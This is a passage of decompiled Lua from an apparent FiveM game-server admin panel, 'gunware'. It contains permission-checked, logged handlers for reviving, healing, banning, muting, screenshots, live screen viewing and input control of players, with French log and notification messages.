                                        L6_2 = L2_2
                                        L7_2 = "success"
                                        L8_2 = string
                                        L8_2 = L8_2.format
                                        L9_2 = "%s a \195\169t\195\169 r\195\169anim\195\169"
                                        L10_2 = GetPlayerName
                                        L11_2 = A1_2.target
                                        L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L10_2(L11_2)
                                        L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                        L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                    end
                                    else
                                      L4_2 = TriggerClientEvent
                                      L5_2 = "gunware:notif"
                                      L6_2 = L2_2
                                      L7_2 = "error"
                                      L8_2 = "Revive functionality not available."
                                      L4_2(L5_2, L6_2, L7_2, L8_2)
                                      L4_2 = logAdminAction
                                      L5_2 = {}
                                      L5_2.action = "Revive - Fonction non disponible"
                                      L6_2 = GetPlayerName
                                      L7_2 = L2_2
                                      L6_2 = L6_2(L7_2)
                                      L5_2.playerName = L6_2
                                      L5_2.source = L2_2
                                      L5_2.description = "Tentative de revive mais la fonction n'est pas disponible"
                                      L5_2.webhook = "error_framework"
                                      L5_2.color = 16711680
                                      L4_2(L5_2)
                                    end
                                    return
                                  else
                                    L4_2 = A1_2.action
                                    if "player_heal" == L4_2 then
                                      L4_2 = L31_1
                                      if L4_2 then
                                        L4_2 = L31_1.heal
                                        if L4_2 then
                                          L4_2 = L31_1.heal
                                          L5_2 = A1_2.target
                                          L4_2(L5_2)
                                          L4_2 = logAdminAction
                                          L5_2 = {}
                                          L5_2.action = "Heal"
                                          L6_2 = GetPlayerName
                                          L7_2 = L2_2
                                          L6_2 = L6_2(L7_2)
                                          L5_2.playerName = L6_2
                                          L6_2 = GetPlayerName
                                          L7_2 = A1_2.target
                                          L6_2 = L6_2(L7_2)
                                          L5_2.targetName = L6_2
                                          L5_2.source = L2_2
                                          L6_2 = A1_2.target
                                          L5_2.targetPlayerId = L6_2
                                          L6_2 = string
                                          L6_2 = L6_2.format
                                          L7_2 = "Soin de %s"
                                          L8_2 = GetPlayerName
                                          L9_2 = A1_2.target
                                          L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2)
                                          L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                          L5_2.description = L6_2
                                          L5_2.webhook = "heal"
                                          L5_2.color = 65280
                                          L4_2(L5_2)
                                          L4_2 = TriggerClientEvent
                                          L5_2 = "gunware:notif"
                                          L6_2 = L2_2
                                          L7_2 = "success"
                                          L8_2 = string
                                          L8_2 = L8_2.format
                                          L9_2 = "%s a \195\169t\195\169 soign\195\169"
                                          L10_2 = GetPlayerName
                                          L11_2 = A1_2.target
                                          L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L10_2(L11_2)
                                          L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                          L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                      end
                                      else
                                        L4_2 = TriggerClientEvent
                                        L5_2 = "gunware:notif"
                                        L6_2 = L2_2
                                        L7_2 = "error"
                                        L8_2 = "Heal functionality not available."
                                        L4_2(L5_2, L6_2, L7_2, L8_2)
                                        L4_2 = logAdminAction
                                        L5_2 = {}
                                        L5_2.action = "Heal - Fonction non disponible"
                                        L6_2 = GetPlayerName
                                        L7_2 = L2_2
                                        L6_2 = L6_2(L7_2)
                                        L5_2.playerName = L6_2
                                        L5_2.source = L2_2
                                        L5_2.description = "Tentative de heal mais la fonction n'est pas disponible"
                                        L5_2.webhook = "error_framework"
                                        L5_2.color = 16711680
                                        L4_2(L5_2)
                                      end
                                      return
                                    else
                                      L4_2 = A1_2.action
                                      if "player_ban" == L4_2 then
                                        L4_2 = BanPlayer
                                        if L4_2 then
                                          L4_2 = GetPlayerName
                                          L5_2 = L2_2
                                          L4_2 = L4_2(L5_2)
                                          if not L4_2 then
                                            L4_2 = "Inconnu"
                                          end
                                          L5_2 = GetPlayerName
                                          L6_2 = A1_2.target
                                          L5_2 = L5_2(L6_2)
                                          if not L5_2 then
                                            L5_2 = "Inconnu"
                                          end
                                          L6_2 = GetPlayerIdentifiers
                                          L7_2 = A1_2.target
                                          L6_2 = L6_2(L7_2)
                                          if not L6_2 then
                                            L6_2 = {}
                                          end
                                          L7_2 = A1_2.time
                                          if "perm" ~= L7_2 then
                                            L7_2 = A1_2.time
                                            if L7_2 then
                                              goto lbl_1306
                                            end
                                          end
                                          L7_2 = "Permanent"
                                          ::lbl_1306::
                                          if not L7_2 then
                                            L7_2 = A1_2.time
                                          end
                                          L8_2 = {}
                                          L9_2 = ipairs
                                          L10_2 = L6_2
                                          L9_2, L10_2, L11_2, L12_2 = L9_2(L10_2)
                                          for L13_2, L14_2 in L9_2, L10_2, L11_2, L12_2 do
                                            L15_2 = #L8_2
                                            L15_2 = L15_2 + 1
                                            L8_2[L15_2] = L14_2
                                          end
                                          L9_2 = #L8_2
                                          if L9_2 > 0 then
                                            L9_2 = table
                                            L9_2 = L9_2.concat
                                            L10_2 = L8_2
                                            L11_2 = "\n"
                                            L9_2 = L9_2(L10_2, L11_2)
                                            if L9_2 then
                                              goto lbl_1331
                                            end
                                          end
                                          L9_2 = "N/A"
                                          ::lbl_1331::
                                          L10_2 = A1_2.banIp
                                          L10_2 = false ~= L10_2
                                          L11_2 = BanPlayer
                                          L12_2 = A1_2.target
                                          L13_2 = A1_2.time
                                          L14_2 = A1_2.reason
                                          L15_2 = L4_2
                                          L16_2 = L10_2
                                          L11_2(L12_2, L13_2, L14_2, L15_2, L16_2)
                                          L11_2 = logAdminAction
                                          L12_2 = {}
                                          L12_2.action = "Ban"
                                          L12_2.playerName = L4_2
                                          L12_2.targetName = L5_2
                                          L12_2.source = L2_2
                                          L13_2 = A1_2.target
                                          L12_2.targetPlayerId = L13_2
                                          L13_2 = string
                                          L13_2 = L13_2.format
                                          L14_2 = "**Bannissement de %s**\n\n**Dur\195\169e:** %s\n**Raison:** %s\n**Ban IP:** %s\n\n**Identifiants:**\n```\n%s\n```"
                                          L15_2 = L5_2
                                          L16_2 = L7_2
                                          L17_2 = A1_2.reason
                                          if not L17_2 then
                                            L17_2 = "Aucune raison"
                                          end
                                          if L10_2 then
                                            L18_2 = "Oui"
                                            if L18_2 then
                                              goto lbl_1367
                                            end
                                          end
                                          L18_2 = "Non"
                                          ::lbl_1367::
                                          L19_2 = L9_2
                                          L13_2 = L13_2(L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                          L12_2.description = L13_2
                                          L12_2.webhook = "ban"
                                          L12_2.color = 16711680
                                          L11_2(L12_2)
                                          L11_2 = TriggerClientEvent
                                          L12_2 = "gunware:notif"
                                          L13_2 = L2_2
                                          L14_2 = "success"
                                          L15_2 = string
                                          L15_2 = L15_2.format
                                          L16_2 = "%s a \195\169t\195\169 banni"
                                          L17_2 = L5_2
                                          L15_2, L16_2, L17_2, L18_2, L19_2 = L15_2(L16_2, L17_2)
                                          L11_2(L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                        else
                                          L4_2 = TriggerClientEvent
                                          L5_2 = "gunware:notif"
                                          L6_2 = L2_2
                                          L7_2 = "error"
                                          L8_2 = "Ban functionality not available."
                                          L4_2(L5_2, L6_2, L7_2, L8_2)
                                          L4_2 = logAdminAction
                                          L5_2 = {}
                                          L5_2.action = "Ban - Fonction non disponible"
                                          L6_2 = GetPlayerName
                                          L7_2 = L2_2
                                          L6_2 = L6_2(L7_2)
                                          L5_2.playerName = L6_2
                                          L5_2.source = L2_2
                                          L5_2.description = "Tentative de ban mais la fonction n'est pas disponible"
                                          L5_2.webhook = "error_framework"
                                          L5_2.color = 16711680
                                          L4_2(L5_2)
                                        end
                                        return
                                      else
                                        L4_2 = A1_2.action
                                        if "clothes_reload" == L4_2 then
                                          L4_2 = L31_1
                                          if L4_2 then
                                            L4_2 = L31_1.reloadskin
                                            if L4_2 then
                                              L4_2 = L31_1.reloadskin
                                              L5_2 = A1_2.target
                                              L4_2(L5_2)
                                              L4_2 = logAdminAction
                                              L5_2 = {}
                                              L5_2.action = "Reload Clothes"
                                              L6_2 = GetPlayerName
                                              L7_2 = L2_2
                                              L6_2 = L6_2(L7_2)
                                              L5_2.playerName = L6_2
                                              L6_2 = GetPlayerName
                                              L7_2 = A1_2.target
                                              L6_2 = L6_2(L7_2)
                                              L5_2.targetName = L6_2
                                              L5_2.source = L2_2
                                              L6_2 = A1_2.target
                                              L5_2.targetPlayerId = L6_2
                                              L6_2 = string
                                              L6_2 = L6_2.format
                                              L7_2 = "Rechargement des v\195\170tements de %s"
                                              L8_2 = GetPlayerName
                                              L9_2 = A1_2.target
                                              L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2)
                                              L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                              L5_2.description = L6_2
                                              L5_2.webhook = "clothes_reload"
                                              L5_2.color = 3447003
                                              L4_2(L5_2)
                                              L4_2 = TriggerClientEvent
                                              L5_2 = "gunware:notif"
                                              L6_2 = L2_2
                                              L7_2 = "success"
                                              L8_2 = string
                                              L8_2 = L8_2.format
                                              L9_2 = "V\195\170tements de %s recharg\195\169s"
                                              L10_2 = GetPlayerName
                                              L11_2 = A1_2.target
                                              L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L10_2(L11_2)
                                              L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                              L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                          end
                                          else
                                            L4_2 = TriggerClientEvent
                                            L5_2 = "gunware:notif"
                                            L6_2 = L2_2
                                            L7_2 = "error"
                                            L8_2 = "Reload skin functionality not available."
                                            L4_2(L5_2, L6_2, L7_2, L8_2)
                                            L4_2 = logAdminAction
                                            L5_2 = {}
                                            L5_2.action = "Reload Clothes - Fonction non disponible"
                                            L6_2 = GetPlayerName
                                            L7_2 = L2_2
                                            L6_2 = L6_2(L7_2)
                                            L5_2.playerName = L6_2
                                            L5_2.source = L2_2
                                            L5_2.description = "Tentative de reload skin mais la fonction n'est pas disponible"
                                            L5_2.webhook = "error_framework"
                                            L5_2.color = 16711680
                                            L4_2(L5_2)
                                          end
                                          return
                                        else
                                          L4_2 = A1_2.action
                                          if "player_openCharacterCreator" == L4_2 then
                                            L4_2 = L29_1
                                            L5_2 = L2_2
                                            L6_2 = "player_openCharacterCreator"
                                            L4_2 = L4_2(L5_2, L6_2)
                                            if not L4_2 then
                                              L4_2 = TriggerClientEvent
                                              L5_2 = "gunware:notif"
                                              L6_2 = L2_2
                                              L7_2 = "error"
                                              L8_2 = "Vous n'avez pas la permission pour cette action."
                                              L4_2(L5_2, L6_2, L7_2, L8_2)
                                              L4_2 = serverSyncLog
                                              L5_2 = string
                                              L5_2 = L5_2.format
                                              L6_2 = "Acc\195\168s refus\195\169 pour %s (ID: %d) sur l'action player_openCharacterCreator"
                                              L7_2 = GetPlayerName
                                              L8_2 = L2_2
                                              L7_2 = L7_2(L8_2)
                                              if not L7_2 then
                                                L7_2 = "Unknown"
                                              end
                                              L8_2 = L2_2
                                              L5_2 = L5_2(L6_2, L7_2, L8_2)
                                              L6_2 = "warning"
                                              L4_2(L5_2, L6_2)
                                              L4_2 = logAdminAction
                                              L5_2 = {}
                                              L5_2.action = "Unauthorized Access Attempt"
                                              L6_2 = GetPlayerName
                                              L7_2 = L2_2
                                              L6_2 = L6_2(L7_2)
                                              if not L6_2 then
                                                L6_2 = "Unknown"
                                              end
                                              L5_2.playerName = L6_2
                                              L5_2.source = L2_2
                                              L6_2 = string
                                              L6_2 = L6_2.format
                                              L7_2 = "Tentative d'acc\195\168s non autoris\195\169 \195\160 l'action: player_openCharacterCreator"
                                              L6_2 = L6_2(L7_2)
                                              L5_2.description = L6_2
                                              L5_2.webhook = "unauthorized_access"
                                              L5_2.reason = "player_openCharacterCreator"
                                              L5_2.color = 16711680
                                              L4_2(L5_2)
                                              return
                                            end
                                            L4_2 = GetPlayerPed
                                            L5_2 = A1_2.target
                                            L4_2 = L4_2(L5_2)
                                            if not L4_2 then
                                              L4_2 = TriggerClientEvent
                                              L5_2 = "gunware:notif"
                                              L6_2 = L2_2
                                              L7_2 = "error"
                                              L8_2 = "Joueur introuvable ou hors ligne."
                                              L4_2(L5_2, L6_2, L7_2, L8_2)
                                              return
                                            end
                                            L4_2 = GetPlayerName
                                            L5_2 = L2_2
                                            L4_2 = L4_2(L5_2)
                                            L5_2 = GetPlayerName
                                            L6_2 = A1_2.target
                                            L5_2 = L5_2(L6_2)
                                            L6_2 = L31_1.characterCreatorCommand
                                            if not L6_2 then
                                              L6_2 = "pedmenu"
                                            end
                                            L7_2 = ExecuteCommand
                                            L8_2 = string
                                            L8_2 = L8_2.format
                                            L9_2 = "%s %d"
                                            L10_2 = L6_2
                                            L11_2 = A1_2.target
                                            L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2, L10_2, L11_2)
                                            L7_2(L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                            L7_2 = logAdminAction
                                            L8_2 = {}
                                            L8_2.action = "Cr\195\169ation de Personnage"
                                            L8_2.playerName = L5_2
                                            L9_2 = string
                                            L9_2 = L9_2.format
                                            L10_2 = "Menu de cr\195\169ation de personnage ouvert pour **%s** (ID: %d)"
                                            L11_2 = L5_2
                                            L12_2 = A1_2.target
                                            L9_2 = L9_2(L10_2, L11_2, L12_2)
                                            L8_2.description = L9_2
                                            L8_2.color = 3447003
                                            L8_2.webhook = "characterCreator"
                                            L9_2 = {}
                                            L10_2 = {}
                                            L10_2.name = "Joueur Cible"
                                            L11_2 = string
                                            L11_2 = L11_2.format
                                            L12_2 = "%s (ID: %d)"
                                            L13_2 = L5_2
                                            L14_2 = A1_2.target
                                            L11_2 = L11_2(L12_2, L13_2, L14_2)
                                            L10_2.value = L11_2
                                            L10_2.inline = true
                                            L11_2 = {}
                                            L11_2.name = "Admin"
                                            L12_2 = string
                                            L12_2 = L12_2.format
                                            L13_2 = "%s (ID: %d)"
                                            L14_2 = L4_2
                                            L15_2 = L2_2
                                            L12_2 = L12_2(L13_2, L14_2, L15_2)
                                            L11_2.value = L12_2
                                            L11_2.inline = true
                                            L12_2 = {}
                                            L13_2 = "Commande Ex\195\169cut\195\169e"
                                            L12_2.name = L13_2
                                            L13_2 = string
                                            L13_2 = L13_2.format
                                            L14_2 = "`%s %d`"
                                            L15_2 = L6_2
                                            L16_2 = A1_2.target
                                            L13_2 = L13_2(L14_2, L15_2, L16_2)
                                            L12_2.value = L13_2
                                            L12_2.inline = false
                                            L13_2 = {}
                                            L14_2 = "Date"
                                            L13_2.name = L14_2
                                            L14_2 = _ENV
                                            L15_2 = "os"
                                            L14_2 = L14_2[L15_2]
                                            L15_2 = "date"
                                            L14_2 = L14_2[L15_2]
                                            L15_2 = "%d/%m/%Y %H:%M:%S"
                                            L14_2 = L14_2(L15_2)
                                            L13_2.value = L14_2
                                            L13_2.inline = false
                                            L9_2[1] = L10_2
                                            L9_2[2] = L11_2
                                            L9_2[3] = L12_2
                                            L9_2[4] = L13_2
                                            L8_2.fields = L9_2
                                            L7_2(L8_2)
                                            L7_2 = TriggerClientEvent
                                            L8_2 = "gunware:notif"
                                            L9_2 = L2_2
                                            L10_2 = "success"
                                            L11_2 = "Menu de cr\195\169ation de personnage ouvert pour "
                                            L12_2 = L5_2
                                            L11_2 = L11_2 .. L12_2
                                            L7_2(L8_2, L9_2, L10_2, L11_2)
                                            return
                                          else
                                            L4_2 = A1_2.action
                                            L5_2 = "player_mute"
                                            if L4_2 == L5_2 then
                                              L4_2 = _ENV
                                              L5_2 = "exports"
                                              L4_2 = L4_2[L5_2]
                                              L5_2 = "pma-voice"
                                              L4_2 = L4_2[L5_2]
                                              if L4_2 then
                                                L4_2 = _ENV
                                                L5_2 = "exports"
                                                L4_2 = L4_2[L5_2]
                                                L5_2 = "pma-voice"
                                                L4_2 = L4_2[L5_2]
                                                L5_2 = "toggleMutePlayer"
                                                L4_2 = L4_2[L5_2]
                                                if L4_2 then
                                                  L4_2 = _ENV
                                                  L5_2 = "exports"
                                                  L4_2 = L4_2[L5_2]
                                                  L5_2 = "pma-voice"
                                                  L4_2 = L4_2[L5_2]
                                                  L6_2 = "toggleMutePlayer"
                                                  L5_2 = L4_2
                                                  L4_2 = L4_2[L6_2]
                                                  L6_2 = A1_2.target
                                                  L4_2(L5_2, L6_2)
                                                  L4_2 = logAdminAction
                                                  L5_2 = {}
                                                  L6_2 = "Mute Player"
                                                  L5_2.action = L6_2
                                                  L6_2 = GetPlayerName
                                                  L7_2 = L2_2
                                                  L6_2 = L6_2(L7_2)
                                                  L5_2.playerName = L6_2
                                                  L6_2 = GetPlayerName
                                                  L7_2 = A1_2.target
                                                  L6_2 = L6_2(L7_2)
                                                  L5_2.targetName = L6_2
                                                  L5_2.source = L2_2
                                                  L6_2 = A1_2.target
                                                  L5_2.targetPlayerId = L6_2
                                                  L6_2 = string
                                                  L6_2 = L6_2.format
                                                  L7_2 = "Mute vocal de %s"
                                                  L8_2 = GetPlayerName
                                                  L9_2 = A1_2.target
                                                  L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2)
                                                  L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                                  L5_2.description = L6_2
                                                  L6_2 = "mute"
                                                  L5_2.webhook = L6_2
                                                  L5_2.color = 16776960
                                                  L4_2(L5_2)
                                                  L4_2 = TriggerClientEvent
                                                  L5_2 = "gunware:notif"
                                                  L6_2 = L2_2
                                                  L7_2 = "success"
                                                  L8_2 = string
                                                  L8_2 = L8_2.format
                                                  L9_2 = "%s a \195\169t\195\169 mute"
                                                  L10_2 = GetPlayerName
                                                  L11_2 = A1_2.target
                                                  L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L10_2(L11_2)
                                                  L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                                  L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
                                              end
                                              else
                                                L4_2 = TriggerClientEvent
                                                L5_2 = "gunware:notif"
                                                L6_2 = L2_2
                                                L7_2 = "error"
                                                L8_2 = "Voice mute functionality not available."
                                                L4_2(L5_2, L6_2, L7_2, L8_2)
                                                L4_2 = logAdminAction
                                                L5_2 = {}
                                                L6_2 = "Mute Player - Fonction non disponible"
                                                L5_2.action = L6_2
                                                L6_2 = GetPlayerName
                                                L7_2 = L2_2
                                                L6_2 = L6_2(L7_2)
                                                L5_2.playerName = L6_2
                                                L5_2.source = L2_2
                                                L6_2 = "Tentative de mute mais pma-voice n'est pas disponible"
                                                L5_2.description = L6_2
                                                L5_2.webhook = "error_framework"
                                                L5_2.color = 16711680
                                                L4_2(L5_2)
                                              end
                                              return
                                            end
                                          end
                                        end
                                      end
                                    end
                                  end
                                end
                              end
                            end
                          end
                        end
                      end
                    end
                  end
                end
              end
            end
          end
        end
      end
    end
  end
  L4_2 = A1_2.action
  L5_2 = "player_screenshot"
  if L4_2 == L5_2 then
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:sync:actionPlayer"
    L6_2 = A1_2.target
    L7_2 = A1_2
    L4_2(L5_2, L6_2, L7_2)
    L4_2 = logAdminAction
    L5_2 = {}
    L6_2 = "Take Screenshot"
    L5_2.action = L6_2
    L6_2 = GetPlayerName
    L7_2 = L2_2
    L6_2 = L6_2(L7_2)
    L5_2.playerName = L6_2
    L6_2 = GetPlayerName
    L7_2 = A1_2.target
    L6_2 = L6_2(L7_2)
    L5_2.targetName = L6_2
    L5_2.source = L2_2
    L6_2 = A1_2.target
    L5_2.targetPlayerId = L6_2
    L6_2 = string
    L6_2 = L6_2.format
    L7_2 = "Screenshot demand\195\169 pour %s"
    L8_2 = GetPlayerName
    L9_2 = A1_2.target
    L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2)
    L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
    L5_2.description = L6_2
    L6_2 = "screenshot"
    L5_2.webhook = L6_2
    L5_2.color = 3447003
    L4_2(L5_2)
    return
  else
    L4_2 = A1_2.action
    L5_2 = "player_stream_view"
    if L4_2 == L5_2 then
      L4_2 = tonumber
      L5_2 = A1_2.target
      L4_2 = L4_2(L5_2)
      if not L4_2 or L4_2 <= 0 then
        L5_2 = TriggerClientEvent
        L6_2 = "gunware:notif"
        L7_2 = L2_2
        L8_2 = "error"
        L9_2 = "Cible invalide pour le live view"
        L5_2(L6_2, L7_2, L8_2, L9_2)
        return
      end
      if L2_2 == L4_2 then
        L5_2 = TriggerClientEvent
        L6_2 = "gunware:notif"
        L7_2 = L2_2
        L8_2 = "error"
        L9_2 = "Impossible d'ouvrir un live view sur soi-meme"
        L5_2(L6_2, L7_2, L8_2, L9_2)
        return
      end
      L5_2 = GetPlayerName
      L6_2 = L4_2
      L5_2 = L5_2(L6_2)
      if not L5_2 then
        L5_2 = TriggerClientEvent
        L6_2 = "gunware:notif"
        L7_2 = L2_2
        L8_2 = "error"
        L9_2 = "Le joueur cible n'est plus connecte"
        L5_2(L6_2, L7_2, L8_2, L9_2)
        return
      end
      L5_2 = L11_1
      L6_2 = L2_2
      L7_2 = "new_session"
      L5_2(L6_2, L7_2)
      L5_2 = L11_1
      L6_2 = L4_2
      L7_2 = "new_session"
      L5_2(L6_2, L7_2)
      L5_2 = L8_1
      L6_2 = L2_2
      L7_2 = L4_2
      L5_2 = L5_2(L6_2, L7_2)
      L6_2 = GetPlayerName
      L7_2 = L4_2
      L6_2 = L6_2(L7_2)
      if not L6_2 then
        L6_2 = "ID "
        L7_2 = tostring
        L8_2 = L4_2
        L7_2 = L7_2(L8_2)
        L6_2 = L6_2 .. L7_2
      end
      L7_2 = L4_1
      L8_2 = {}
      L9_2 = "sessionId"
      L8_2[L9_2] = L5_2
      L8_2.adminSrc = L2_2
      L9_2 = "targetSrc"
      L8_2[L9_2] = L4_2
      L8_2.targetName = L6_2
      L9_2 = "createdAt"
      L10_2 = _ENV
      L11_2 = "os"
      L10_2 = L10_2[L11_2]
      L10_2 = L10_2.time
      L10_2 = L10_2()
      L8_2[L9_2] = L10_2
      L7_2[L5_2] = L8_2
      L7_2 = TriggerClientEvent
      L8_2 = "gunware:stream:startBroadcaster"
      L9_2 = L4_2
      L10_2 = {}
      L11_2 = "sessionId"
      L10_2[L11_2] = L5_2
      L10_2.target = L4_2
      L10_2.adminSrc = L2_2
      L10_2.targetName = L6_2
      L7_2(L8_2, L9_2, L10_2)
      L7_2 = TriggerClientEvent
      L8_2 = "gunware:stream:openViewer"
      L9_2 = L2_2
      L10_2 = {}
      L11_2 = "sessionId"
      L10_2[L11_2] = L5_2
      L10_2.target = L4_2
      L10_2.targetName = L6_2
      L11_2 = "startedAt"
      L12_2 = _ENV
      L13_2 = "os"
      L12_2 = L12_2[L13_2]
      L12_2 = L12_2.time
      L12_2 = L12_2()
      L10_2[L11_2] = L12_2
      L7_2(L8_2, L9_2, L10_2)
      L7_2 = logAdminAction
      L8_2 = {}
      L9_2 = "Live View"
      L8_2.action = L9_2
      L9_2 = GetPlayerName
      L10_2 = L2_2
      L9_2 = L9_2(L10_2)
      L8_2.playerName = L9_2
      L8_2.targetName = L6_2
      L8_2.source = L2_2
      L8_2.targetPlayerId = L4_2
      L9_2 = string
      L9_2 = L9_2.format
      L10_2 = "Live view WebRTC demarre sur %s"
      L11_2 = L6_2
      L9_2 = L9_2(L10_2, L11_2)
      L8_2.description = L9_2
      L8_2.webhook = "spectate"
      L8_2.color = 3447003
      L7_2(L8_2)
      L7_2 = L7_1
      L8_2 = "session %s started admin=%d target=%d"
      L9_2 = L8_2
      L8_2 = L8_2.format
      L10_2 = L5_2
      L11_2 = L2_2
      L12_2 = L4_2
      L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L8_2(L9_2, L10_2, L11_2, L12_2)
      L7_2(L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
      return
    else
      L4_2 = A1_2.action
      L5_2 = "admin_notification"
      if L4_2 == L5_2 then
        L4_2 = A1_2.type
        if L4_2 then
          L4_2 = "message"
          L4_2 = A1_2[L4_2]
          if L4_2 then
            L4_2 = TriggerClientEvent
            L5_2 = "gunware:notif"
            L6_2 = A1_2.target
            L7_2 = A1_2.type
            L8_2 = "message"
            L8_2 = A1_2[L8_2]
            L4_2(L5_2, L6_2, L7_2, L8_2)
          end
        end
        return
      end
    end
  end
  L4_2 = TriggerClientEvent
  L5_2 = "gunware:sync:actionPlayer"
  L6_2 = A1_2.target
  L7_2 = A1_2
  L4_2(L5_2, L6_2, L7_2)
end
L63_1(L64_1, L65_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:takecontrol:update"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:takecontrol:update"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L1_2 = source
  L2_2 = L5_1
  L2_2 = L2_2[L1_2]
  if not L2_2 then
    return
  end
  L3_2 = type
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  if "table" ~= L3_2 then
    return
  end
  L3_2 = TriggerClientEvent
  L4_2 = "gunware:takecontrol:apply"
  L5_2 = L2_2
  L6_2 = {}
  L7_2 = A0_2.input
  if not L7_2 then
    L7_2 = {}
  end
  L6_2.input = L7_2
  L7_2 = A0_2.ts
  if not L7_2 then
    L7_2 = 0
  end
  L6_2.ts = L7_2
  L3_2(L4_2, L5_2, L6_2)
end
L63_1(L64_1, L65_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:takecontrol:stop"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:takecontrol:stop"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L1_2 = source
  L2_2 = L5_1
  L2_2 = L2_2[L1_2]
  if not L2_2 then
    return
  end
  L2_2 = type
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if "table" == L2_2 then
    L2_2 = A0_2.reason
    if L2_2 then
      goto lbl_16
    end
  end
  L2_2 = "manual_stop"
  ::lbl_16::
  L3_2 = L12_1
  L4_2 = L1_2
  L5_2 = L2_2
  L6_2 = false
  L7_2 = false
  L3_2(L4_2, L5_2, L6_2, L7_2)
end
L63_1(L64_1, L65_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:stream:signal"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:stream:signal"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = source
  L2_2 = type
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if "table" ~= L2_2 then
    return
  end
  L2_2 = A0_2.sessionId
  L3_2 = A0_2.signalType
  L4_2 = A0_2.data
  if not L2_2 or "" == L2_2 or not L3_2 then
    return
  end
  L5_2 = L9_1
  L6_2 = L2_2
  L5_2 = L5_2(L6_2)
  if not L5_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:stream:stopClient"
    L8_2 = L1_2
    L9_2 = {}
    L9_2.sessionId = L2_2
    L10_2 = A0_2.role
    L9_2.role = L10_2
    L9_2.reason = "session_missing"
    L6_2(L7_2, L8_2, L9_2)
    return
  end
  L6_2 = L5_2.adminSrc
  if L1_2 == L6_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:stream:signal"
    L8_2 = L5_2.targetSrc
    L9_2 = {}
    L9_2.sessionId = L2_2
    L9_2.signalType = L3_2
    L9_2.data = L4_2
    L9_2.from = "viewer"
    L6_2(L7_2, L8_2, L9_2)
  else
    L6_2 = L5_2.targetSrc
